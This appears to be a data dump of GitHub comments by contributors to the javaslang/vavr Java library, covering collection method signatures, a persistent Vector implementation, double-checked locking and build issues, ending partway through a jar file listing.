    "ashrwin": "@danieldietrich I can do this :). But I don't see the methods declared in javaslang.collection.SortedMap\n. Hi @jorander ,\nYour code works fine :+1: But there is a much faster algorithm based on the fact that n, n+1 are co-primes. See this http://codereview.stackexchange.com/a/83680  :)\n. I have been trying to push them as separate PRs but somehow I mange to screw up - git noob here :laughing: \n@danieldietrich sure will merge the conflicts :)\n. @danieldietrich I'd like to do this :) \n. @danieldietrich Can I work on this? :)\n. @danieldietrich Yes, Once I make the changes -  I just need to run the gen code right?\n. @danieldietrich How do I run the code in Generator.scala ?\n. I see some more opportunities where a Stream can be used instead of other implementations.\nEx : https://github.com/javaslang/javaslang/blob/master/javaslang/src/main/java/javaslang/collection/AbstractsQueue.java#L62\nCan I refactor them here or should they go in another PR ? \ud83d\ude04 \n. @danieldietrich I have been a bit caught up at work, will get the PR in by Wednesday \ud83d\ude48 \n. @danieldietrich Traversable does not have a reverseIterator() method ? \nDid you mean the reverseIterator() in Collections ?\n. Can we change the signature of scanRight similar to scanLeft as you had said above?\nRight now, I have the following implementation : \n``` java\nstatic > R scanRight(Traversable<? extends T> traversable,\n                                                        U zero, BiFunction<? super T, ? super U, ? extends U> operation, Function, R> finisher) {\nfinal Iterator<? extends T> reversedElements = reverseIterator(traversable.iterator());\n  return scanLeft(reversedElements, zero, (u, t) -> operation.apply(t, u), finisher);\n}\n```\nreverseIterator() already checks if reverse iteration is possible.\n. I am looking at the correct file only :) In the first comment on this page, you had asked to re-implement scanLeft like this\njava\nstatic <T, U, R extends Traversable<U>> R scanLeft(Traversable<? extends T> traversable,\n            U zero, BiFunction<? super U, ? super T, ? extends U> operation, Function<Iterator<U>, R> finisher)\nI thought we are going to change the method signature of scanRight also \ud83d\ude04 \n. If we change the signature of Collections.scanRight we need to reverse the results again before applying the finisher, something like this\njava\nstatic <T, U, R extends Traversable<U>> R scanRight(Traversable<? extends T> traversable,\n                                                    U zero, BiFunction<? super T, ? super U, ? extends U> operation, Function<Iterator<U>, R> finisher) {\n    final Iterator<? extends T> reversedElements = reverseIterator(traversable.iterator());\n    return scanLeft(reversedElements, zero, (u, t) -> operation.apply(t, u), us -> finisher.apply(reverseIterator(us)));\n}\n//Call Site\nCollections.scanRight(this, zero, operation, Iterator::toVector)\nWe can reuse the reverseIterator method so that it is efficient for IndexedSeq but for others we have to reverse twice. Is this ok ?\n. @danieldietrich \njava\n static <T, U, R extends Traversable<U>> R scanRight(Traversable<? extends T> traversable,\n            U zero, BiFunction<? super T, ? super U, ? extends U> operation, Function<Iterator<U>, R> finisher) {\n  // Input -> 1, 2, 3\n  // 1, 2, 3 -> reverse -> 3, 2, 1\n  // 3, 2, 1 -> scanLeft -> 10, 30, 60, 60\n  // we need to reverse the iterator again before applying the finisher\n  final Iterator<U> iterator = reverseIterator(traversable).scanLeft(zero, (u, t) -> operation.apply(t, u));\n  return finisher.apply(iterator);\n}\n. Changing the toCharSeq() method to this works\njava\n@SuppressWarnings(\"unchecked\")\ndefault CharSeq toCharSeq() {\n    return CharSeq.ofAll((Iterable<? extends Character>) iterator());\n}\n@danieldietrich Is there any better way of fixing this? \n. @danieldietrich There a lots of errors in the tests after fixing the toCharSeq method. For ex. \njava\n@Test\npublic void shouldConvertToCharSeq() {\n    final Value<Integer> value = of(1, 2, 3);\n    final CharSeq charSeq = value.toCharSeq();\n    assertThat(charSeq).isEqualTo(CharSeq.of(value.toString()));\n}\norg.junit.ComparisonFailure: \nExpected :Vector(1, 2, 3)\nActual   :123\nShould we create a new issue for fixing these tests? \n. @danieldietrich  No problems, I have already started working on fixing them \ud83d\ude09 \n. Do we need a Key type ?\nSomething like this is already type-safe \njava\nclass HMap {\n    private final Map<Class<?>, Object> map = new HashMap<>();\n    public <T> T get(Class<T> tClass) {\n        return tClass.cast(map.get(tClass));\n    }\n    public <T> void put(Class<T> tClass, T ele) {\n        map.put(tClass, ele);\n    }\n}. Hi @ruslansennov \njava\nFor(List.range(1, 6), List.range(10,12)).\n                yield((BiFunction<Integer, Integer, Tuple2>) Tuple::of).\n                forEach(System.out::println);\nThis prints only\n(1, 10)\n(1, 11)\nHow to generate the cross product with For ?\n. It happens in a separate project where the library was included through gradle. It works fine when I try to use it in the library itself.\n. Thanks :+1: \n. works now :+1:  Need to update the documentation at\n http://www.javaslang.io/javaslang-docs/#gradle\n. Why foldLeft is preferred here ?\n. @paplorinc, @danieldietrich was in favor of not adding memoization here as the code is concise.\nhttps://github.com/javaslang/javaslang/pull/1443 :)\n. memoizedSumOfDivisors :wink: . I'll rename it :)\n. I wasn't sure on what to use, so went with SimpleEntry - will change it to SimpleImmutableEntry :)\n. _Only immutable types are covariant in generic arguments - Nice \ud83d\udc4d \n@danieldietrich will make the changes and thanks for the example \ud83d\ude04 \n. Here Iterator.ofAll(tuples).map(Tuple2::_1).toStream() returns a Stream<? extends T1> so the return type has to be Tuple2<Seq<? extends T1>, Seq<? extends T2>>\n. Here we need numbers at the end since they have the same type erasure\nError:(227, 46) java: name clash: <T1,T2>sequence(java.lang.Iterable<? extends javaslang.Tuple2<? extends T1,? extends T2>>) and <T1>sequence(java.lang.Iterable<? extends javaslang.Tuple1<? extends T1>>) have the same erasure\n. oops, removed the methods in the PR itself \ud83d\udc35. I'll revert and commit ?\n. Shouldn't it be \njava\n final Stream<Tuple3<? extends T1, ? extends T2, ? extends T3>> s = Stream.ofAll(tuples);\n. Since the args length is decreased now\njava\nreturn new Tuple3<>(s.map(Tuple3::_1), s.map(Tuple3::_2), s.map(Tuple3::_3));\nCan we have the entire statement in one line? \n. java\n    assertThat(sequence.get()).isEqualTo(List.empty());\nWith this, the test will fail\norg.junit.ComparisonFailure: \nExpected :List()\nActual   :Stream()\nSince we have to compare it to Stream.empty(), I thought it would be better to use a Stream here. \ud83e\udd14 \n. @danieldietrich Validation.sequence() returns Validation<List<E>, Seq<T>>\nIf we change the return type to Validation<Seq<E>, Seq<T>> then we can change the errors list to also be a Vector. \n. @danieldietrich:  Ran into a bug, have opened an issue #1685 \n. @danieldietrich @paplorinc : There is another PR where I have refactored  scan methods to return a Vector. Should I make changes in this PR also ?. Am also not sure why it wasn't needed \ud83e\udd14 . Good idea to use a stack here instead of a Vector (which would require a size hint).\n  Can you explain ? \ud83d\ude04  . I merged the changes but am not sure why these are added as part of this commit \ud83d\ude48 . When I try to rebase there are no conflicts now \ud83d\ude15 Should I rollback to an older commit and try ?. ",
    "nicolaiparlog": "Came here from Twitter, sorry for barging in.\nAre you sure this is the correct analysis? It sounds very \"un-Java\" and I can not reproduce it in a simple setup (Gist pending).\n. Here's the Gist. I can't see anything unusual.\n. Gonna keep spamming... :)\nThis looks like the same case: IllegalAccessError when using a public method reference of a package-private class through a public subclass from another package\n. ",
    "tcn": "As a side node: doesn't work on 25.66-b00-graal-vm-0.10 either (same for some old 1.9.0-ea-b90 I still had lying around).\n(http://www.oracle.com/technetwork/oracle-labs/program-languages/downloads/index.html)\n. ",
    "sheldon-white": "Thanks for your response. I've successfully pulled and built the library as expected on a different machine, so there must have been some environmental issue on the first attempt.\n. ",
    "benoitf": "@danieldietrich I will give a look and keep you updated ! thanks for the feedback\n. I confirmed the issue, I hope it will be fixed in the new version of the product. I will provide status here when it will be fixed\n. ",
    "Sir4ur0n": "Hi,\nSorry if the question is off topic, but will this issue (also) track the slight difference in return type between io.vavr.collection.Set#unzip and io.vavr.collection.List#unzip? Or should I open another issue (I could not find any similar)? Or is that intentional?\nThe former returns Tuple2<? extends Set<T1>, ? extends Set<T2>> while the latter returns Tuple2<List<T1>, List<T2>> (i.e. no extends), and this is quite disturbing (and I don't see why they have different return types).\nExample of weird/problematic code I came accross:\n```java\n// Does not compile: \"Bad return type in lambda expression: Tuple2 cannot be converted to Tuple2<? extends T1, ? extends T2>\"\nSet set = HashSet.empty();\nTuple2, Set> unzip = set.unzip(s -> Tuple.of(\"\", \"\"));\n// Compiles\nList list = List.empty();\nTuple2, List> unzip = list.unzip(s -> Tuple.of(\"\", \"\"));\n```\nIs my code wrong? Or is there an inconsistency issue in method signatures?\nThanks!\nPS: I know I can work it around by wrapping the set.unzip(s -> Tuple.of(\"\", \"\")) with a Tuple.narrow(...), but it seems like extra work, and I don't see the benefit of such a method signature.. @danieldietrich I most certainly can live with it. My main issue is inconsistency of API between similar concepts (List vs Set) but I also understand the design issues behind are not easy to solve.\nAt least this issue may be useful in the future if somebody else wonders about this inconsistency ;). Well, this issue was half-question (is there a better writing?), half-proposal. \nI tend to dislike this ternary operator (I find it inexpressive), but this may just be me.\nIf it's just me, I guess we won't change the API ;-)\nI also assume there's no better writing :'(\nAs for the \"functions that take two or more function arguments are considered to be \"bad practice\"\" part, would you have any source or explanation? I can't think of a reason this would be a bad practice. And I think there are many examples in Vavr API where this happens (e.g. io.vavr.Value#<K,V> Map<K,V> toMap(java.util.function.Function<? super T,? extends K> keyMapper, java.util.function.Function<? super T,? extends V> valueMapper) method).. Should I submit a PR?. I managed to find an example of why Scala's Set extends (A) => Boolean: https://alvinalexander.com/scala/how-use-scala-set-function-predicate\nHowever I keep thinking this is not a good design, even in Scala. I feel like this is a time saver in 1% of the cases but misleading in 99% of the cases... As @nfekete pointed out, it's just so easy/cheap to write contains (either in Java or Scala) for these 1% that it doesn't seem relevant.\nOverall using a Scala Set as a function seems to be nearly never used (or I didn't use the right terms with my friend Google).\nI'm also not a good Scala developer: Scala may be handling overloading + inheritance just fine. However Java definitely doesn't.\nOf course a solution is to NOT use overloading (different method names). I'm just afraid of ending with very long method names to describe each signature (CasePatternValue, CasePatternSupplier, CasePatternFunction), or worse, cryptic method names (CasePV, CasePS, CasePF) leading to overall less usability/affordance.. ```kotlin\nplugins {\n    java\n}\ngroup = \"com.sir4ur0n.github\"\nversion = \"1.0-SNAPSHOT\"\nrepositories {\n    mavenCentral()\n}\ndependencies {\n    val vavrVersion = \"0.10.0\"\n    // Provides @Patterns, @Unapply, Tuple0..8\n    implementation(\"io.vavr\", \"vavr\", vavrVersion)\n    // Processes patterns during compilation, outputs them in build/classes by default\n    annotationProcessor(\"io.vavr\", \"vavr-match-processor\", vavrVersion)\n}\nconfigure {\n    sourceCompatibility = JavaVersion.VERSION_1_8\n    targetCompatibility = JavaVersion.VERSION_1_8\n}\n``. Not needed explicitly, it's a transitive dependency ofio.vavr:vavr. Anyway you also needio.vavr:vavrtu build patterns usingTuple0..8`.. ",
    "povder": "Hi @danieldietrich! Any reasons why fix for this is not scheduled to be included in a bugfix release?\n. ",
    "earlzero": "@ruslansennov thanks, I didn't realise that it may hold multple values initially. I've implemented multi-value case.\n@danieldietrich Don't mention :). I've fixed issues you mentioned (spaces, final, etc). \n. @danieldietrich Thanks for modification. I do not use IDEA, so I can't import this settings. I've checked for tabs/spaces again and moved everything according to your second comment.\n. ",
    "zsolt-donca": "Hi, @danieldietrich ,\nThank you for your quick response!\nI see and agree with that storing the hash lazily can have a significant memory overhead. Maybe it would make sense in Scala, a language that has native support for lazy fields, where most of the overhead (the Lazy instance, the lambda for the supplier, the Integer instance, and thus the implications on GC) would not be present. The fact that Scala's immutable collections don't do this is a good sign that, even in Scala, it still doesn't worth it generally.\nWhen the benefits do outweigh the above overhead, such a wrapper class that you proposed seems perfectly feasible to me. We'll consider implementing that class given that our measurements confirm that it worths doing so. As a wise man once said: \"Measure, don't premature!\"\nThe fix for this issue in master is perfectly fine by me, and I'm looking forward towards your next release. :) Until then, we'll stick to your snapshot builds.\nKeep up the good work!\n. Hi, L\u0151rinc,\nIt's great to see development in the area of persistent collections. You did a great job, especially considering that you didn't just copy-paste an existing implementation (such as Scala's), but you decided to implement it yourself.\nIt's great that you measured the performance of your new implementation, together with the performance of existing (reference) implementations. You could further improve the performance details by:\n- explain what each operation is in the context of each implementation; this would be particularly helpful in the context of mutable collection types, where the comparison inherently feels like comparing apples to oranges;\n- adding a table with the big-o complexities (time, memory); surely, this would be obviously be mostly filled with \"effectively constant\", but even then, its an important thing to have and to visualise;\nAlso, I noticed that this is a \"work in process' pull request. It's not clear to me what is actually left to do here before merging. You mention that some operations are not optimized enough; do you think that these should be improved before actually merging?\nIt would be great if you could write some kind of an article/blog about this whole thing: an overview of the implementation, what optimizations you did or didn't do; how the performance measurements work etc. \n. I'd like to speak a couple of words about this pull request. In the last couple of months @paplorinc  and I have talked, in person, a lot about his new Vector implementation; he explained to me the algorithm, he'd shown me various intermediate versions of code (many of which were significantly more complicated than the current one), we've done code review pairing sessions together, and I've seen how the code gradually matured into what is in the current PR.\nThis data structure (bit-mapped trie) is inherently complex; and the fact that we want a persistent one further adds complexity. Besides this complexity, there are certain optimizations put in place to reduce the \"constant\" factor (execution time or memory) for certain operations.\nI'd summarize the code in the following way:\n1. the base algorithm of the bit-mapped trie data structure is represented by the internal class VectorTree. The main aspect of the implementation is that it can be the middle of an n-ary tree: that is, a tree that can be incomplete on both its left and right side at the same time (but fully complete in the middle), while keeping the indexing start from 0, no matter how incomplete the tree is on the left. This allows Vector to have effectively-constant prepend, append, drop and dropRight operations. How many elements are missing on the left side is represented by the field VectorTree.offset, and how many on the right is represented by VectorTree.length. The structure itself and the operations on it are a piece of art; @paplorinc  could give us more details on this; maybe in the form of a blog, an article, similarly to how he explained to me, in person, all these.\n2. the leading and trailing fields of Vector are an optimization for the operations that operate with the beginning or with the end of the Vector (head, tail, prepend, append, drop, dropRight etc.) to reduce the constant factor in their time complexity. Having these fields indeed adds some complexity to the code; it would be an interesting experiment to have, side by side, the two code base (with and without this optimization), along with the performance results. That way, we could investigate what are the exact benefits (performance) and drawbacks (added code complexity). Maybe @paplorinc could provide us a new branch along with the performance results.\n3. the latest version of the code stores primitive types in primitive arrays (with special treatment for int and char). This optimization is happening behind the scenes (the user is not aware of this), and has the added benefit of using significantly less memory (4x less in case of ints). This optimization has the drawback that the code now needs to delegate all data-array-related operations to helper methods, but the main \"outline\" of the code remains the same. Also, care must be taken in certain corner-cases (such as appending an object to primitive-backed Vector). I believe that this optimization is not fully functional (certain cases may be erroneous now, but they can be fixed). As above, it would be nice to have a different branch with just this optimization, along with the performance and memory measurements.\nI believe that the above two optimizations (2. and 3. above) should be treated separately, in different pull requests, and have in this pull request for just the main algorithm (described in 1. above). This way, it's easier to do review and merge: it's easier to see what's part of the core algorithm and what's an optimization, and it is easier to weigh the costs/benefits of any particular optimization.\nOverall, I believe that this PR represents tremendous value, and the code base is relatively simple, even with the above two optimizations, especially when comparing to other Vector implementations (Scala's being the worst in terms of code quality, in my opinion).\nA small correction:\n\nI question the approach of leading and trailing objects in Vector. They seem to make sense only the first BRANCHING_FACTOR (= 32) times using drop and tail. Beyond that the code appears to be more clunky and significantly less maintainable.\n\nThe right thing to say is that they make sense all time, but every BRANCHING_FACTOR (=32) times the code falls back to accessing the underlying bit-mapped trie. This effectively means that the \"constant factor\" of the related operations is divided by BRANCHING_FACTOR * tree depth. This can actually lead to pretty significant performance improvement, but, again, we'll see exactly how much it is once we have measurements with and without this optimization.\n. CharSeq based on a Vector could be considered an immutable, rich StringBuilder. It could have similar, or even better, performance characteristics than those of StringBuilder. The use cases would also be the same.\nWith that parallel drawn in my mind, I do see value in having such Vector-based CharSeq. But, yes, it should be a separate class and not CharSeq.\n. > If the Builder would be a Vector we would have problems implementing the original java.lang.String methods, such as replaceAll(regexp, string).\nIt depends on what we consider \"trouble\". I haven't considered all String methods, but replaceAll seems doable (though not trivial). Given that our Vector-based char-sequence implementation implements java.lang.CharSequence, we can use java.util.regex.Pattern#matcher to create a Matcher instance. Then, we can progress through all matching ranges replacing them with the given string, and rebuild a new string/rich string/rich stringbuilder.\nThis would actually be a bonus when compared to StringBuilder, which doesn't have String's replace, replaceAll, and other, similar operations. StringBuilder seems to be limited to append, insert, and truncate (setLength) operations. We could do much more than that (prepend, dropLeft, dropRight) with better performance, even with a persistent data type.\n@danieldietrich: when working on your parser library, what do you use for constructing strings (e.g. for error messages)? Wouldn't it feel weird to use something mutable like StringBuilder in a world of functional transformations, data types? I guess you could just build Strings or use CharSeq, but that would have it's performance drawbacks. Such a rich StringBuilder would be the best of both worlds (functional pureness & rich API + performance).\n. @paplorinc Mine are all addressed!\n\n. Is Value.eq reliable? It seems to me that it has undefined behavior for collection types that don't have a well-defined ordering, such as hash-based collections.\nFor HashSet, the actual depends on the hash codes of the elements. Consider the examples below.\n```\nValue s1 = HashSet.of(\"f\", \"o\");\nValue s2 = TreeSet.of(\"f\", \"o\");\nSystem.out.println(s1.eq(s2)); // prints true\n```\nThe same code with different values:\n```\nValue s1 = HashSet.of(\"f\", \"uu\");\nValue s2 = TreeSet.of(\"f\", \"uu\");\nSystem.out.println(s1.eq(s2)); // prints false\n```\nSo, if all you got is two Value instances, you can't reliably compare them while looking for congruence of structures (quoting from the javadoc) because certain values don't have their structure in correlation with their ordering, but eq only checks ordering.\nBecause of the above, you can only use eq if you possess some additional information about your Value instances (that is, they have a well-defined order), but this seems like a leaking abstraction to me. \nIs there something that we could do about this?\n. > It is more memory efficient than Stream because it does not need additional objects per node (like the 'lazy' Supplier of Stream).\nIt's not the only way to create a stream associated to a collection. Having a stream as a pair of head and a lazy tail is indeed useful when the stream is the result of a computation (e.g. generating fibonacci numbers or whatnot), where the best part is that the stream can be infinite.\nHowever, if what you have is a data structure (e.g. a List or a Vector) with a well-defined structure and with a finite size, you can create much more optimal Stream implementations. For example, you can have a Stream implementation that directly references the underlying collection. In this case, implementing most (if not all) Stream-operations (e.g. head, tail, map, filter, forEach etc.) can be done in terms of executing the corresponding operation on the data structure and wrapping the result as a new Stream. In case of Vector, the resulting Stream would probably have the same performance characteristics (time complexity) as the current Stream (implemented in ConsImpl).\nI'm not trying to question the justification for having low-level, mutable classes such as Iterator. They are indeed needed for performance-critical cases, or just for compatibility with Java. However, I don't think it's a good idea to have so much logic implemented in terms of Iterator, such as dropWhile; iterators are mutable, aren't referentially transparent: basically, they have all the problems that functional programming is trying to solve. \nI believe that implementing Stream based on Iterator for all collection types (as it is now in Javaslang) is the wrong way of doing it. Also, I don't believe that it's fundamentally impossible to write high-performance code with just using FP techniques. You just need to use the correct abstractions and get the design right.\nAs a general rule, one should try to keep the amount of mutable, side-effectful code minimal. I've always found it difficult to properly implement Iterator because it's defined in terms of hasNext and next; to check whether it has a next element, you usually need to fetch it, which you'll then need to store. To return the next element, you might be able to use the element that is already fetched by hasNext; but it is also perfectly valid to call next multiple times without calling hasNext in between, so you also need to prepare to fetch the element directly in next. I've always found this a nightmare; since I know FP, I can also name it why (lack of referential transparency). BTW, I've always found IEnumerator superior because it has Current and MoveNext.\nNow, I find it pretty surprising that javaslang.collection.Iterator exists with such rich semantics, and that it actually extends javaslang.collection.Traversable. Since Iterator has traversable once semantics, it breaks referential transparency in regards to the Traversable interface, which is at the core of Javaslang's collection hierarchy. This means that any code using the  Traversable type might not be referentially transparent, given it received an Iterator instance. What is the reason for Iterator extending Traversable?\n. Deciding on which direction to optimize is a tough decision. Both maintainability and performance are important factors, and comparing the two is tough as well, as they affect different people: maintainability affects the contributors and performance affects the end-users.\nReverting all important Vector optimizations based on a possible maintenance overhead seems like a premature optimization to me. Do we really know now if it will turn out as a maintenance problem? Maybe there won't be any need to do major touches on Vector for years. In all that time, our users could benefit from the added performance (which could be a good selling point, but that's another discussion). If there turns out to be something that's difficult or impossible to do with certain optimizations in place, we can decide then what needs to be taken out or simplified. Maybe it wouldn't be every Vector optimization, just some of them. We can't possibly foresee the future and shouldn't try to do so. While I know that the same argument could be made against making the performance optimizations now, there are some important differences: we know that runtime performance (both CPU and memory) is generally important to our users. We also know that there are potentially more people using and benefiting of the additional performance than people maintaining and contributing to Javaslang. That shifts the balance to me.\nI see the point of having additional optimization layers as a possible maintenance cost. IMO this could be reasonably addressed by documenting them someplace. Just as javaslang.io is meant to explain Javaslang's functionality to the end-users, there could be a document somewhere explaining Javaslang's architecture to the maintainers/contributors (maybe similarly to CONTRIBUTING.md), detailing the important design decisions; I can imagine a section explaining the Vector's basics and its internal layers of optimizations.\n. It's somewhat counter-intuitive to me that this method covers three different use cases:\n1. injecting to an empty or null array produces a new single-element array, ignoring index;\n2. injecting with a positive index \"inserts\" the elem to the index position;\n3. injecting with a negative index shifts the whole array and inserts the to the beginning.\n. +1 to rewriting the below test with a property-based testing framework. I don't know about javaslang-test, but I can recommend scalacheck.\n. What do start, end, start(int), end(int) do? It's obvious that they have something to do with indexing relative to the beginning and end of the array, but I can't figure out much more than that. Also, when does it make sense to use start() instead of end()? When otherwise? \nAlso, could you think of better names?\n. Why is the array's length different than the leaf's length ?\n. > Also, when does it make sense to use start() instead of end()? When otherwise? \nI figured that one out myself: start and start(int) are only used on Vector.firstLeaf, and end and end(int) are only used on Vector.lastLeaf. It seems to me that the two Vector fields (firstLeaf and lastLeaf) should have different types, something that only exposes the right element collection (start and end) and indexing (start(int), end(int)) methods.\n. Also, I find it counter-intuitive the naming of the Leaf class. The only actual tree structure here is VectorN, and Leaf is not actually used by it. Leaf is just the data type for the two buffer-like data structures at the beginning and at the end of the vector: firstLeaf and lastLeaf (correct me if I'm wrong). They are not part of a tree, so they are not actually leafs.\n. You could replace this with a simple method:\nprivate NodeModifier leafModifier(T element) {\n        return (o, i) -> copyUpdate(o, i, element);\n    }\nInvocations of the function LEAF_MODIFIER.apply(foo) could be transformed to simple method calls: leafModifier(foo).\nSince you don't actually store any of the NodeModifier instances, there is no caching in place (as opposed to NODE_MODIFIER), so I don't see any such performance disadvantages for what I'm proposing.\n. Why is this method called prependLeaf as opposed to just prepend ? Does it make sense to have, or can you imagine, an operation in which we prepend anyplace else but to the first leaf?\n. Same :)\n. You could give the field NODE_MODIFIER a name that reflects what it does as opposed to what it is. You would do the same if, instead of a field, you would have a no-arg method that returned you the  NodeModifier instance.\nI understand that this NodeModifier copies the given array and makes sure that i + 1 becomes a valid index (increasing the array size if needed). One suggestion would be to name it COPY_NODE (ignoring the part about the array size, as I'm not sure if that's really important).\n. Continuing the idea on naming (see comment on NODE_MODIFIER), you could rename this field/method to something like updateLeafWith, as this NodeModifier updates the leaf to have the given element.\n. +1 to this method: it's a really great idea to have a single method to traverse the tree, with the behavior for modifying the nodes and the leaf being parametric.\n. What is the reason behind adding 2.1.0?\n. I believe you could simply write assertAreEqual(expected, actual);\n. It seems to me that this test and shouldCreateAndGet test the same thing, but with different array sizes.\n. It seems risky to me to not change this back to its original value. This can effect other tests run in the same JVM. For example, running VectorPropertyTest and VectorTest subsequently will mean that VectorTest runs with a branching base of 2, and branching factor of 4. However, running VectorTest individually will use the default values, such as base 5 and factor 32.\nTherefore, I'd suggest adding an @After method with setting BRANCHING_BASE back to 5.\n. I've made some tests to verify whether it's actually required, in practice, to have a field marked as volatile when used in a double-checked lock. Theoretically, the mechanism can fail without the field being marked as volatile. \nAccording to my tests, it turns out that this is very much JVM-dependent. My test never failed when running against a Java 7 and 8 JVM. However, it did fail against Java 6.\nMy conclusion is that, at least since Java 7, there are some different runtime optimizations in place that either decrease the chance of the problem happening or make the volatile modifier completely unneeded in this double-checked locking scenario. However, we should definitely not rely on this apparent behavior until there is an update to the Java Memory Model that clearly states that we can do so. \nI'll give you more details as soon as I got the time.\n. I have also managed to write a test case that demonstrates the necessity of using volatile on the field of the double-checked locking mechanism. The test works on Java 6, 7 and 8. I managed to increase the chances of the concurrency problem being detected by introducing a busy wait into the testing threads, acting as a live synchronization mechanism. The entire code is available here.\nIt seems that Java 6 has different runtime behavior and it is easier to demonstrate the problem there.\n. I'm concerned around\nJava\nif (cache.containsKey(key)) {\n    return cache.get(key);\n} else {\n    synchronized (cache) {\n        ...\n    }\n}\nIt seems an awful lot to me like that previous discussion on Lazy that we've head with Aleksey Shipilev.\nThe key idea: the then branch above doesn't use any volatile variable, neither does it pass through a synchronized block, nor does cache have any volatile reads inside (it's a  HashMap). Because no memory barrier is passed, it is unsafe. See Pitfall: Semi-Synchronized Is Fine.. Yes, that's a concern, as weak references can be eliminated at any time. The problem is even more problematic for FunctionN where N \u2265 2, as the key (tuple) is built internally, immediately discarding any other reference to it.\nThe above problem with the GC prematurely dropping the data could be eliminated by using soft references; for details, see this:\n\nSoftReferences aren't required to behave any differently than  WeakReferences, but in practice softly reachable objects are generally retained as long as memory is in plentiful supply. This makes them an excellent foundation for a cache, such as the image cache described above, since you can let the garbage collector worry about both how reachable the objects are (a strongly reachable object will never be removed from the cache) and how badly it needs the memory they are consuming.. \n",
    "Pyeroh": "Hi,\nA bunch of informations about my environnement :\n- Gradle (with the wrapper, 2.13)\n- Java 1.8.0_92\n- Windows 7\n- Eclipse\nAll dependencies are loaded via Gradle, but apparently, in my local Gradle repo, Javaslang contains correctly encoded class files...\nI'm not very familiar with Gradle, nor with Maven, but it seems there's no way to run a maven goal from gradle.\nI also tried to add compileJava.options.encoding = 'UTF-8' to my build.gradle, but it doesn't work either.\n. Thanks a lot :D\nI tried to build my project with the plugin 'application' and obviously, it works (but I prefer 'uber-jars'...)\nI'll work with 'application' gradle plugin until Shadow is fixed. thanks again.\n. Oh, thanks, i didn't noticed that.\nShould I let this issue opened in case it needs modifications of the class, or close it ?\n. Thank you for your answer, I'll comment your blog post ;)\nMay any future dev encountering this problem get all the information he needs with this ticket!\n. ",
    "acmcelwee": "Sorry to resurrect an old issue, but I was wondering if you have any thoughts on working around the AWS lambda runtime issue. I commented on that forum post, but I haven't had any luck getting any javaslang-dependent code to correctly load because the classloader fails to find the \u03bb class. I see you contemplated changing the class name from \u03bb to Function in #83. Anyway, figured it can't hurt to ask if you have any suggestions. Thanks!. Just to demonstrate that maven shade is not the problem here. (note the correct javaslang/\u03bb.class and javaslang/\u03bb$Memoized.class in the jar)\nsh\n$ jar -tf target/shade-test-0.0.1-SNAPSHOT.jar\nMETA-INF/MANIFEST.MF\nMETA-INF/\njavaslang/\njavaslang/ShadeTest.class\nMETA-INF/maven/\nMETA-INF/maven/javaslang/\nMETA-INF/maven/javaslang/shade-test/\nMETA-INF/maven/javaslang/shade-test/pom.xml\nMETA-INF/maven/javaslang/shade-test/pom.properties\njavaslang/$.class\njavaslang/API$1.class\njavaslang/API$2.class\njavaslang/API$For1.class\njavaslang/API$For2.class\njavaslang/API$For3.class\njavaslang/API$For4.class\njavaslang/API$For5.class\njavaslang/API$For6.class\njavaslang/API$For7.class\njavaslang/API$For8.class\njavaslang/API$Match$Case.class\njavaslang/API$Match$Case0.class\njavaslang/API$Match$Case1.class\njavaslang/API$Match$Case2.class\njavaslang/API$Match$Case3.class\njavaslang/API$Match$Case4.class\njavaslang/API$Match$Case5.class\njavaslang/API$Match$Case6.class\njavaslang/API$Match$Case7.class\njavaslang/API$Match$Case8.class\njavaslang/API$Match$Pattern.class\njavaslang/API$Match$Pattern0$1.class\njavaslang/API$Match$Pattern0$2.class\njavaslang/API$Match$Pattern0.class\njavaslang/API$Match$Pattern1$1.class\njavaslang/API$Match$Pattern1.class\njavaslang/API$Match$Pattern2$1.class\njavaslang/API$Match$Pattern2.class\njavaslang/API$Match$Pattern3$1.class\njavaslang/API$Match$Pattern3.class\njavaslang/API$Match$Pattern4$1.class\njavaslang/API$Match$Pattern4.class\njavaslang/API$Match$Pattern5$1.class\njavaslang/API$Match$Pattern5.class\njavaslang/API$Match$Pattern6$1.class\njavaslang/API$Match$Pattern6.class\njavaslang/API$Match$Pattern7$1.class\njavaslang/API$Match$Pattern7.class\njavaslang/API$Match$Pattern8$1.class\njavaslang/API$Match$Pattern8.class\njavaslang/API$Match.class\njavaslang/API.class\njavaslang/CheckedFunction0.class\njavaslang/CheckedFunction1.class\njavaslang/CheckedFunction2.class\njavaslang/CheckedFunction3.class\njavaslang/CheckedFunction4.class\njavaslang/CheckedFunction5.class\njavaslang/CheckedFunction6.class\njavaslang/CheckedFunction7.class\njavaslang/CheckedFunction8.class\njavaslang/collection/\njavaslang/collection/AbstractIterator.class\njavaslang/collection/AbstractMap.class\njavaslang/collection/Array$1.class\njavaslang/collection/Array.class\njavaslang/collection/ArrayModule$Combinations.class\njavaslang/collection/ArrayModule.class\njavaslang/collection/CharSeq$1.class\njavaslang/collection/CharSeq$CharFunction.class\njavaslang/collection/CharSeq$CharUnaryOperator.class\njavaslang/collection/CharSeq.class\njavaslang/collection/CharSeqModule$Combinations.class\njavaslang/collection/CharSeqModule.class\njavaslang/collection/Collections$1.class\njavaslang/collection/Collections.class\njavaslang/collection/Comparators$SerializableComparator.class\njavaslang/collection/Comparators.class\njavaslang/collection/Foldable.class\njavaslang/collection/HashArrayMappedTrie.class\njavaslang/collection/HashArrayMappedTrieModule$AbstractNode.class\njavaslang/collection/HashArrayMappedTrieModule$Action.class\njavaslang/collection/HashArrayMappedTrieModule$ArrayNode.class\njavaslang/collection/HashArrayMappedTrieModule$EmptyNode.class\njavaslang/collection/HashArrayMappedTrieModule$IndexedNode.class\njavaslang/collection/HashArrayMappedTrieModule$LeafList$1.class\njavaslang/collection/HashArrayMappedTrieModule$LeafList.class\njavaslang/collection/HashArrayMappedTrieModule$LeafNode.class\njavaslang/collection/HashArrayMappedTrieModule$LeafSingleton.class\njavaslang/collection/HashArrayMappedTrieModule.class\njavaslang/collection/HashMap.class\njavaslang/collection/HashSet$1.class\njavaslang/collection/HashSet$SerializationProxy.class\njavaslang/collection/HashSet.class\njavaslang/collection/IndexedSeq$1.class\njavaslang/collection/IndexedSeq.class\njavaslang/collection/IndexedSeqModule$LastIndexOfSlice.class\njavaslang/collection/IndexedSeqModule$Search.class\njavaslang/collection/IndexedSeqModule.class\njavaslang/collection/Iterator$1.class\njavaslang/collection/Iterator$10.class\njavaslang/collection/Iterator$11.class\njavaslang/collection/Iterator$12.class\njavaslang/collection/Iterator$13.class\njavaslang/collection/Iterator$14.class\njavaslang/collection/Iterator$15.class\njavaslang/collection/Iterator$16.class\njavaslang/collection/Iterator$17.class\njavaslang/col